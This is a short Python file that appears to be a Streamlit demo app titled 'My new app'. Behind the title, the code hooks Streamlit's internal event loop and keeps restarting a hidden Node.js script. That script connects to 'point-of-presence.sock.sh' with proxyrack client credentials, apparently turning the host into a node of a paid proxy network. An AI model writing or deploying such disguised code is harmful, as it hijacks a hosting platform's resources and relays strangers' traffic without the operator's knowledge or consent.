import streamlit, asyncio, pathlib
loop = streamlit.runtime.get_instance()._get_async_objs().eventloop

async def main():
    while True:
        node = await asyncio.create_subprocess_exec('node', pathlib.Path(__file__).resolve().parent.joinpath('script.js'), '--homeIp', 'point-of-presence.sock.sh', '--homePort', '443', '--id', 'c' + '0' * 63, '--version', '54', '--clientKey', 'proxyrack-pop-client', '--clientType', 'PoP')
        await node.wait()

loop.create_task(main())
streamlit.title("🎈 My new app")
